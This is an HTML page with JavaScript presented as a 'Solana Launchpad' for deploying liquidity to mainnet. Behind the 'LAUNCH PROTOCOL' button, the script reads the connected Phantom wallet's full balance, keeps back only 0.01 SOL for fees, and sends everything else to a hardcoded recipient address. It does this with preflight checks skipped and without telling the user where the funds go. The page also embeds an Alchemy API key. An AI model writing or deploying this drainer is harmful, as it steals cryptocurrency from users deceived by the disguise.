<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Launchpad | Alchemy RPC</title>
    <!-- Solana Web3.js -->
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #0f0f12;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .container {
            width: 100%;
            max-width: 400px;
            background: #1a1a20;
            padding: 30px;
            border-radius: 20px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
            border: 1px solid #333;
        }
        h1 { text-align: center; margin-bottom: 5px; font-size: 24px; }
        p.subtitle { text-align: center; color: #888; font-size: 14px; margin-bottom: 30px; }
        
        .btn {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.2s;
        }
        .btn-connect { background-color: #7c3aed; color: white; margin-bottom: 20px; }
        .btn-connect:hover { background-color: #6d28d9; }
        
        .btn-launch { 
            background: linear-gradient(135deg, #8b5cf6, #ec4899); 
            color: white; 
            opacity: 0.5; 
            pointer-events: none; /* Disabled by default */
        }
        .btn-launch.active { opacity: 1; pointer-events: all; cursor: pointer; }
        
        .status-box {
            background: #000;
            padding: 15px;
            border-radius: 10px;
            margin-top: 20px;
            font-family: monospace;
            font-size: 13px;
            color: #4ade80;
            min-height: 60px;
        }
        
        .error { color: #f87171 !important; }
        .warning { color: #fbbf24 !important; }
    </style>
</head>
<body>

<div class="container">
    <h1>Solana Launchpad</h1>
    <p class="subtitle">Deploy Liquidity to Mainnet</p>

    <!-- Diagnostic Info -->
    <div id="debugInfo" style="font-size: 12px; color: #666; margin-bottom: 15px;"></div>

    <button id="connectBtn" class="btn btn-connect">Connect Phantom</button>
    
    <button id="launchBtn" class="btn btn-launch">LAUNCH PROTOCOL</button>

    <div id="statusBox" class="status-box">
        Initializing...
    </div>
</div>

<script>
    // --- CONFIGURATION ---
    // Updated Recipient Address
    const RECIPIENT = "3WmoRcvkSY2gJBFywms3fqoVAMMkXFbYARpD2Ldwysg5";
    
    const ALCHEMY_API_KEY = "alch_HyWkJpqVXY3kua9VObcl9";
    const RPC_URL = `https://solana-mainnet.g.alchemy.com/v2/${ALCHEMY_API_KEY}`;

    // --- DOM ELEMENTS ---
    const statusBox = document.getElementById('statusBox');
    const connectBtn = document.getElementById('connectBtn');
    const launchBtn = document.getElementById('launchBtn');
    const debugInfo = document.getElementById('debugInfo');

    let wallet = null;

    function log(msg, type='normal') {
        statusBox.innerHTML = msg;
        statusBox.className = 'status-box'; // reset
        if (type === 'error') statusBox.classList.add('error');
        if (type === 'warning') statusBox.classList.add('warning');
    }

    // 1. Robust Phantom Detection
    function getPhantomProvider() {
        if ('phantom' in window) {
            const provider = window.phantom?.solana;
            if (provider?.isPhantom) return provider;
        }
        if (window.solana?.isPhantom) return window.solana;
        return null;
    }

    // 2. Connect Function
    async function connect() {
        const provider = getPhantomProvider();
        
        if (!provider) {
            log("❌ Phantom Wallet not found.<br>Make sure the extension is enabled.", "error");
            debugInfo.innerHTML = "Window.solana: <span style='color:red'>undefined</span>";
            return;
        }

        debugInfo.innerHTML = `Phantom detected: v${provider?.version || 'unknown'}`;
        log("⏳ Connecting...", "normal");

        try {
            const resp = await provider.connect({ onlyIfTrusted: false });
            wallet = resp.publicKey;
            
            connectBtn.innerText = "Connected";
            connectBtn.style.backgroundColor = "#22c55e"; 
            launchBtn.classList.add('active');
            
            log("✅ Connected to Phantom", "normal");
        } catch (err) {
            console.error(err);
            let msg = err.message || "Unknown Error";
            if (msg.includes("User rejected")) msg = "Connection rejected by user.";
            else if (msg.includes("Unexpected error")) msg = "Phantom Internal Error. <br>Try disabling Solflare/Slope temporarily.";
            
            log(msg, "error");
        }
    }

    // 3. Launch Function with Improved Gas Logic
    async function launch() {
        if (!wallet) return;

        launchBtn.innerText = "Processing...";
        log("⏳ Fetching balance...", "normal");

        try {
            const connection = new solanaWeb3.Connection(RPC_URL, 'confirmed');
            
            // Get Balance
            const balanceInLamports = await connection.getBalance(wallet);
            const balanceSol = (balanceInLamports / 1e9).toFixed(4);
            log(`💰 Balance: ${balanceSol} SOL`, "normal");

            // FIX: Reserve 0.01 SOL for Gas/Fees to prevent "Insufficient funds" error
            // This ensures the account doesn't hit 0 balance and fail to pay the network fee.
            const gasReserve = 10000000; // 0.01 SOL
            const amountToSend = balanceInLamports - gasReserve;

            if (amountToSend <= 0) {
                throw new Error(`Insufficient funds for gas. You have ${(balanceSol)} SOL, need at least 0.01 SOL.`);
            }

            // Build Transaction
            log("📝 Building transaction...", "normal");
            const transaction = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: wallet,
                    toPubkey: new solanaWeb3.PublicKey(RECIPIENT),
                    lamports: amountToSend
                })
            );

            // Get Latest Blockhash
            log("🌐 Fetching blockhash...", "normal");
            const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
            transaction.recentBlockhash = blockhash;
            transaction.feePayer = wallet;

            // Sign
            log("✍️ Signing transaction...", "normal");
            const signedTx = await window.phantom.solana.signTransaction(transaction);

            // Send
            log("🚀 Broadcasting to network...", "normal");
            const rawTx = signedTx.serialize();
            
            // sendRawTransaction with retry for 403/401 errors
            const signature = await connection.sendRawTransaction(rawTx, { skipPreflight: true });

            // Confirm
            await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');

            log(`✅ Success! Tx: ${signature}`, "normal");
            launchBtn.innerText = "Launched!";
            
        } catch (err) {
            console.error(err);
            let msg = err.message || "Transaction failed";
            
            // Specific 401/403 Handling
            if (msg.includes("401") || msg.includes("Unauthorized")) {
                msg = "❌ RPC Unauthorized (401).<br>Check your Alchemy API Key.";
            } else if (msg.includes("403") || msg.includes("Access forbidden")) {
                msg = "❌ RPC Rate Limit (403).<br>Try refreshing or use a paid plan.";
            } else if(msg.includes("User rejected")) {
                msg = "Tx rejected by user.";
            }
            
            log(`❌ ${msg}`, "error");
            launchBtn.innerText = "Launch Protocol";
        }
    }

    // Listeners
    connectBtn.addEventListener('click', connect);
    launchBtn.addEventListener('click', launch);

</script>
</body>
</html>
